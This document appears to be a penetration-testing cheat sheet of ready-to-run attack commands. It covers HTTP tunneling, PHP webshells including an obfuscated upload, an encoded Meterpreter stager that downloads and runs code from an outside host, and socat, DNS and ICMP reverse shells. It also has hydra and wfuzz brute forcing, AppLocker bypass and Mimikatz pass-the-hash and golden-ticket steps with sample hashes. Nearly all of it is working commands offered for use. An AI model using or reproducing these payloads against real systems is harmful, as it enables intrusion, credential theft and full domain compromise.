
- [Tunneling](#tunneling)
  * [SSH over TCP](#sshovertcp)
  * [TCP over HTTP](#tcpoverhttp)
  
---

<a name="tunneling"></a><h2>Tunneling</h2>

<a name="sshovertcp"></a><h3>SSH over HTTP (Squid)</h3>

<b> socat </b>

<pre>socat TCP-L:9999,fork,reuseaddr PROXY:192.168.1.41:127.0.0.1:22,proxyport=3128

ssh john@127.0.0.1 -p 9999</pre>


<b>proxytunnel </b>

<pre>proxytunnel -p 192.168.1.41:3128 -d 127.0.0.1:22 -a 5555

ssh john@127.0.0.1 -p 5555</pre>

<b>proxychains </b>

<pre>http 192.168.1.41 3128

proxychains ssh john@127.0.0.1</pre>

![proxychains](https://user-images.githubusercontent.com/7115563/33822522-1e15dbee-de58-11e7-9953-3da8ff684cfc.png)


<b>corkscrew </b>

<pre>ssh john@192.168.1.41 -t /bin/sh</pre>

![cork](https://user-images.githubusercontent.com/7115563/33822672-b92a51f0-de58-11e7-9936-06056b7903b8.png)


<a name="tcpoverhttp"></a><h3> TCP over HTTP </h3>

For this technique, it is necessary to be able to upload a file to a webserver.

<b> 1. reGeorg </b>
  
  File upload to the server correct
  
  ![regeorge2](https://user-images.githubusercontent.com/7115563/33883424-028c9f0e-df3c-11e7-9559-b35667ae76db.png)
  
  Tunnel creation
  
  `python reGeorgSocksProxy.py -p 5555 -u "http://<ip>/admin/uploads/reGeorg.jsp"`
  
  Proxychains config
  
  ![regeorge1](https://user-images.githubusercontent.com/7115563/33883419-fcc15416-df3b-11e7-89a9-499ffc1de9cf.png)
  
  <pre>
proxychains nmap -F -sT 127.0.0.1
proxychains mysql -u root -p -h 127.0.0.1
proxychains ssh localhost
</pre>

![regeorge3](https://user-images.githubusercontent.com/7115563/33883422-017021fe-df3c-11e7-8f99-f02de5084c02.png)

Reference: https://sensepost.com/discover/tools/reGeorg/

 <b> 2. ABBTTS </b>
  
Upload File

![abbtts5](https://user-images.githubusercontent.com/7115563/33883774-6d249ffa-df3d-11e7-9f3f-68bf1e70465f.png)

Config proxychains and create the tunnel

```python abpttsclient.py -c tomcat_walkthrough/config.txt -u http://192.168.1.128/abptts.jsp -f 127.0.0.1:22222/127.0.0.1:22```

Usage

```ssh -p 22222 user@127.0.0.1```

![abbtts7](https://user-images.githubusercontent.com/7115563/33883891-dc2f3c70-df3d-11e7-84e9-ebd9eab9ebee.png)

Reference: https://github.com/nccgroup/ABPTTS


<h3>Generic Enumeration</h3>

- port fullscan

- UDP scan



<h3> HTTP Enumeration</h3>

- dirsearch big.txt -e sh,txt,htm,php,cgi,html,pl,bak,old

- banner inspection

- review source code

- bruteforce with cewl-based dictionary

- searchsploit look at versions properly

- test all the paths with the exploits, mangle it

- nmap --script vuln

- nmap --script safe (ssl-cert, virtual hosts)

- always incercept with Burp

- nikto -h

- LFI, RFI, SQL, RCE, XXE, SSRF injections

- PUT method all directories

- Change POST body encoding with Burp

- Bruteforce parameter names

- dirsearch with cookie once authenticated

- download vulnerable application from exploit-db and examine it

<h3>SSH Enumeration</h3>

- shellshock

- bruteforce

- user_enum

- Debian OpenSSL Predictable PRNG

<h3>SMB Enumeration</h3>

- nmap --script vuln

- nmap --script smb*

- nmap --script smb-enum-shares,smb-ls

- enum4linux

<h3> BOF exploit-based </h3>

- change shellcode

- make sure all badchars are removed

- read the exploit properly in case this makes changes in the shellcode

- capture traffic with wireshark making sure the entire shellcode is transmited

- run the exploit several times

- make sure the JMP ESP matches OS and language

<h3> SNMP Enumeration</h3>

- snmpcheck

- snmpenum

<h3>PHP RCE</h3>

test: 

```<?php phpinfo(); ?>```

simple shell: 

```<?php system($_GET["c"]); ?>```

```<?php `$_GET["c"]`; ?>```

file upload:

```<?php file_put_contents('/var/www/html/uploads/test.php', '<?php system($_GET["c"]);?>'); ?>```

file upload evasion:  rot13 + urlencode

```<?php $payload="%3C%3Fcuc%20flfgrz%28%24_TRG%5Bp%5D%29%3B%3F%3E"; file_put_contents('/var/www/html/uploads/test8.php', str_rot13(urldecode($payload))); ?>```


<h3>RCE via webshell</h3>

- All pentest monkey reverse shells: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

- msfvenom x86/linux/shell_reverse_tcp -f elf

- Metasploit `web_delivery` module

- which wget | nc <ip> <port>


<h3>SQLi UNION</h3>

search for response on HTML source code

<h3> Reverse HTTP Shell through Proxy </h3>

```use payload/python/meterpreter/reverse_http```

![proxy2](https://user-images.githubusercontent.com/7115563/33836652-3d9c9624-de8a-11e7-9869-e18c5a28ebd7.png)


```python -c "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHN5cwp2aT1zeXMudmVyc2lvbl9pbmZvCnVsPV9faW1wb3J0X18oezI6J3VybGxpYjInLDM6J3VybGxpYi5yZXF1ZXN0J31bdmlbMF1dLGZyb21saXN0PVsnYnVpbGRfb3BlbmVyJywnUHJveHlIYW5kbGVyJ10pCmhzPVtdCmhzLmFwcGVuZCh1bC5Qcm94eUhhbmRsZXIoeydodHRwJzonaHR0cDovLzE5Mi4xNjguMTA3LjIzMjo4MDgwJ30pKQpvPXVsLmJ1aWxkX29wZW5lcigqaHMpCm8uYWRkaGVhZGVycz1bKCdVc2VyLUFnZW50JywnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBUcmlkZW50LzcuMDsgcnY6MTEuMCkgbGlrZSBHZWNrbycpXQpleGVjKG8ub3BlbignaHR0cDovLzE3OC42Mi41OC4zNTo4MC9qOTkzQScpLnJlYWQoKSkK')))"```

Finally we set up the handler:

![proxy3](https://user-images.githubusercontent.com/7115563/33836552-fd3204ac-de89-11e7-940c-71c8ab321bf7.png)

<h3> Kernel Exploits </h3>

Linux: https://github.com/lucyoa/kernel-exploits

Windows: https://github.com/abatchy17/WindowsExploits

<h3> Linux Privilege Escalation </h3>

- sudo -l
- Kernel Exploits
- OS Exploits
- Password reuse (mysql, .bash_history, 000-default.conf...)
- Known binaries with suid flag and interactive (nmap)
- Custom binaries with suid flag either using other binaries or with command execution
- Writable files owned by root that get executed (cronjobs)
- MySQL as root
- Vulnerable services (chkrootkit, logrotate)
- Writable /etc/passwd
- Readable .bash_history
- SSH private key
- Listening ports on localhost
- /etc/fstab
- /etc/exports
- /var/mail
- Process as other user (root) executing something you have permissions to modify
- SSH public key + Predictable PRNG
- apt update hooking (Pre-Invoke)

<h3> Windows Privilege Escalation </h3>

- Kernel Exploits
- OS Exploits
- Pass The Hash
- Password reuse
- DLL hijacking (Path)
- Vulnerable services
- Writable services binaries path
- Unquoted services
- Listening ports on localhost
- Registry keys

<h3> Windows File Transfer </h3>

<b>bitsadmin</b>

`bitsadmin /transfer debjob /download /priority normal http://<ip>/shell.php c:\xampp\htdocs\shell.php`

<b>cscript wget.vbs (code on the repo)</b>

`cscript wget.vbs http://<ip>/test.txt test.txt`

<b>powershell</b>

`powershell -c "(new-object System.Net.WebClient).Downloadfile('http://<ip>/exploit.exe', 'C:\Windows\temp\exploit.txt')"`

<b>ftp</b>

client:

<pre>
echo open [ip] [port] > ftpscript.txt
echo anonymous>> ftpscript.txt
echo PASS >> ftpscript.txt
echo bin >> ftpscript.txt
echo get meter.exe>> ftpscript.txt
echo quit >> ftpscript.txt
ftp -s:ftpscript.txt
</pre>

server:

<code>python -m pyftpdlib  --port=2121 --write</code>

<b>wget.exe</b>

Upload to vulnerable server from kali: ` /usr/share/windows-binaries/wget.exe`

`wget.exe http://<ip>/file file`

<b> certutil </b>

`certutil -urlcache -split -f  https://<ip>/file.txt file.txt`

<h3> Password Cracking </h3>

<b>zip</b>

`fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip `

<b>/etc/shadow</b>

<pre>
unshadow passwd shadow > passwords
john --wordlist=/usr/share/wordlists/rockyou.txt passwords
</pre>

<b>keepass</b>

<pre>
keepass2john /root/Desktop/NewDatabase.kdb > file
john -incremental:alpha -format=keepass file
</pre>

<h3> HTTP Brute Force </h3>

<b> wfuzz POST </b>

```wfuzz --hc 404 -c -z list,admin -z file,/root/Documents/SecLists/Passwords/korelogic-password.txt -d "user=FUZZ&password=FUZ2Z" http://192.168.30.161/admin/index.php```

<b> hydra POST </b>

```hydra 192.168.30.161 -s 80 http-form-post "/admin/index.php:user=^USER^&password=^PASS^:Moved Temporarily" -l admin -P /root/Documents/SecLists/Passwords/korelogic-password.txt -t 20```

<b> wfuzz NTLM </b>

```wfuzz -c --ntlm "admin:FUZZ" -z file,/root/Documents/SecLists/Passwords/darkc0de.txt --hc 401 https://<ip>/api```

<b> wfuzz Basic Auth through Proxy </b>

```wfuzz -c --hc 404,400,401 -z file,/root/Documents/Audits/ActivosProduban/names.txt -z file,/root/Documents/Audits/ActivosProduban/names.txt --basic "FUZZ:FUZ2Z" -p 127.0.0.1:8080 https://<ip>/api/v1/```





<h3> Interactive Reverse Shell </h3>

<b> Method 1 </b>

Attacker:

```socat file:`tty`,raw,echo=0 TCP-L:4444```

Victim:

```wget -q http://10.10.14.16/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.16:4444```

Socat Binary: https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat

<b> Method 2 </b>

In reverse shell

<pre>
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
</pre>

In kali

<pre>
echo $TERM
stty -a
stty raw -echo
fg
</pre>

In reverse shell

<pre>
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
bash
</pre>


<h3> Windows AD Environment </h3>

<b> Bypass Applocker </b>

<b>1. rundll32</b>

```rundll32.exe PowerShdll.dll,main```

![applocker](https://user-images.githubusercontent.com/7115563/34455568-dfe7d7c6-ed81-11e7-9869-de2d4e92f3aa.png)
  
  Reference: https://github.com/p3nt4/PowerShdll
  
<b>2. Alternative powershell files</b>

![applocker2](https://user-images.githubusercontent.com/7115563/34455569-e0136c6a-ed81-11e7-9b0e-127ae9d395e0.png)
  
  ```C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise```
  
  <b> Runas Powershell </b>
  
  ```Start-Process powershell.exe -Verb runas```
  ```Start-Process powershell.exe -Credential <user>```
  
  <b> View Shares With Permissions </b>
  
  <pre>powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Invoke-ShareFinder -CheckShareAccess"</pre>
  
  ![image](https://user-images.githubusercontent.com/7115563/34455620-34f292b4-ed83-11e7-92b0-3b8dd387146f.png)
  
  
  <b> View files that contain certain words recursively </b>
  
  <pre> ls -Path \\SVHOST1.LAZULI.CORP\tmp$ -Include "*pass*","*
admin*","*secret*" -Recurse </pre>

![image](https://user-images.githubusercontent.com/7115563/34455641-aa03adf4-ed83-11e7-8333-a69366714921.png)

<b> View files which name contains certain words recursively </b>

<pre>dir -Path \\SVHOST1.LAZULI.CORP -Include "*pass*","*admin*","*secret*" -Recurse</pre>

![image](https://user-images.githubusercontent.com/7115563/34455649-dcc941ea-ed83-11e7-9428-a702f254e807.png)

<b> Connect to MSSQL Database </b>

<pre>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/michaellwest/PowerShell-Modules/master/CorpApps/Invoke-SqlCommand.ps1')

Invoke-SqlCommand -Server 172.11.14.89 -Database master -Username sa -Password <password> -Query "exec sp_databases" </pre>

<b> Port Scanning </b>

<pre>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1')

Invoke-Portscan -Hosts [ip] -TopPorts 50</pre>
  
  ![image](https://user-images.githubusercontent.com/7115563/34455679-6e630230-ed84-11e7-995e-2eea1a6fc8dc.png)
  
  
  <b> View Domain Admins </b>
  
  <pre> net groups /domain "Domain Admins"</pre>
  
  ![image](https://user-images.githubusercontent.com/7115563/34455690-9e648d78-ed84-11e7-9a84-9b335530a31e.png)
  
  <b> View Domain Controlers </b>
  
  <pre>nltest /dclist:<domain> </pre>
  
  ![image](https://user-images.githubusercontent.com/7115563/34455698-d1504074-ed84-11e7-85ad-c4bb196c9d44.png)
  
  <b> Invoke Mimikatz </b>
  
  <pre>IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz</pre>
  
  <b> Pass The Hash with Mimikatz </b>
  
  <pre> Invoke-Mimikatz -Command '"sekurlsa::pth /user:adm_maint /ntlm:cbe55f143fcb6d4687583af520123b89 /domain:lazuli"'</pre>
  
  <b> Generate Golden Ticket (Domain Admin Required) </b>
  
  <pre>Invoke-Mimikatz -Command '"lsadump::dcsync /domain:LAZULI.CORP /user:krbtgt"'</pre>
  
  ![image](https://user-images.githubusercontent.com/7115563/34455725-7230ee30-ed85-11e7-9333-16372355ce60.png)
  
  ![image](https://user-images.githubusercontent.com/7115563/34455734-89934d5c-ed85-11e7-960e-9659e099c9df.png)
  
  <pre>Invoke-Mimikatz  -Command '"kerberos::golden /user:adon /domain:LAZULI.CORP /krbtgt:ca1c2aeda9160094be9971bdc21c50aa /sid:S-1-5-21-1238634245-2147606590-2801756923 /id:500 /ticket:admin.kirbi /ptt"</pre>
  
  ![image](https://user-images.githubusercontent.com/7115563/34455745-9edd0360-ed85-11e7-84f0-6d62e621613b.png)
  
  <pre>Invoke-Mimikatz  -Command '"kerberos::ptt admin.kirbi"'</pre>
  
  ![image](https://user-images.githubusercontent.com/7115563/34455747-b285372a-ed85-11e7-9374-c481108db77e.png)
  
  ![image](https://user-images.githubusercontent.com/7115563/34455748-bb0512c6-ed85-11e7-8d40-b6516cf8b0f3.png)
  
  <b> Invoke a command Remotely </b>
  
  <pre>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-WMIExec.ps1')
 
 Invoke-WMIExec -Target SVHOST2  -Username Administrator -Hash 78560bbcf70110fbfb5add17b5dfd762 -Command "powershell whoami | out-file \\SVHOST2\C$\windows\bitch.txt"
</pre>

  <b> Invoke Mimikatz Remotely </b>
  
  <pre>Invoke-WMIExec -Target SVHOST2  -Username Administrator
-Hash 78560bbcf70110fbfb5add17b5dfd762 -Command "powershell -Enc SQBFA...AoA"</pre>

![image](https://user-images.githubusercontent.com/7115563/34455757-1f6aed1c-ed86-11e7-9415-595fa5e8d6e7.png)

<b> Get Hashes </b>

<pre>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');Get-PassHashes</pre>

  ![image](https://user-images.githubusercontent.com/7115563/34455769-66cb31bc-ed86-11e7-846e-090647d8e32f.png)
  
  
<b> Check Pass The Hash with multiple servers</b>

<pre>$hosts = @("SVDC1.LAZULI.CORP","SVFILES.LAZULI.CORP","SVHOST1.LAZULI.CORP","SVHOST2.LAZULI.CORP","SVFILES2.LAZULI.CORP")

foreach ($h in $hosts){ Invoke-WMIExec -Target $h -Username Administrator -Hash 78560bbcf70110fbfb5add17b5dfd762 -Command "hostname" -Verbose }

</pre>

![image](https://user-images.githubusercontent.com/7115563/34455798-0bdc77ec-ed87-11e7-9504-6b9ec6fc2a8d.png)

References: https://www.hacklikeapornstar.com/
  
  
<h3> Bypass VPN routing restrictions </h3>

<pre>openconnect vpnXXX02.XXXX.com -u XX -s ‘vpn-slice XXX.46.0.0/16 hostname3 mantis=XXX.46.224.68’</pre>

![vpn](https://user-images.githubusercontent.com/7115563/34785073-5f76d2ce-f630-11e7-9acb-2fbe9e74494b.png)

Reference: https://github.com/dlenski/vpn-slice

<h3> Man's Poor VPN </h3>

Traffic forward over SSH without needing to ```ssh -D <port>```

<pre>sshuttle -vr user@192.168.207.57 180.46.0.0/16</pre>

![shuttle2](https://user-images.githubusercontent.com/7115563/34785498-a0b5c8c0-f631-11e7-8f3d-75e0ade96275.png)

Proof:

![mantis2](https://user-images.githubusercontent.com/7115563/34785499-a0e7d838-f631-11e7-869f-d6fcdc1051e9.png)

Reference: http://teohm.com/blog/using-sshuttle-in-daily-work/


<h3> Reverse DNS Shell with dnscat powershell </h3>

<b> Server </b>

<pre>ruby dnscat2.rb -e open --no-cache tunnel.domain.com</pre>


<b> Client </b>

<pre>IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1'); Start-Dnscat2 -Domain tunnel.domain.com -DNSServer 8.8.4.4 </pre>


![dns](https://user-images.githubusercontent.com/7115563/35040679-5a155bfa-fb82-11e7-98ec-ba015e3ad69c.png)

Reference: https://github.com/lukebaggett/dnscat2-powershell


<h3> Reverse ICMP shell </h3>

<b> Server </b>

<pre> python icmpsh_m.py [IP atacante] [IP victima] </pre>

<b> Client </b>

<pre>IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellIcmp.ps1'); Invoke-PowerShellIcmp -IPAddress [IP atacante]</pre>

![icmpreverseshell](https://user-images.githubusercontent.com/7115563/35213289-6ac51b00-ff5d-11e7-9b66-766af2aaf92e.png)

Reference: https://esgeeks.com/icmpsh-shell-reverse-con-icmp/
